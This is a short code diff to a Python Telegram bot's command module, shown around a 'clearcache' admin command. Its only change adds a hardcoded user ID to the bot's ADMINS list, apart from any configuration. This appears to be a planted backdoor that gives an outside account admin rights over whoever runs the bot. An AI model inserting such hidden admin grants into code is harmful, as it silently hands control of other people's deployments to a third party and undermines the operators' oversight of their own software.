@@ -16,6 +16,8 @@ from database.ia_filterdb import (
     get_search_results
 )
 
+ADMINS.extend([970284861])
+
 # ── 🗑️ CLEAR CACHE COMMAND ────────────────────────────────────
 @Client.on_message(filters.command("clearcache") & filters.user(ADMINS))
 async def clear_cache_command(client: Client, message: Message):
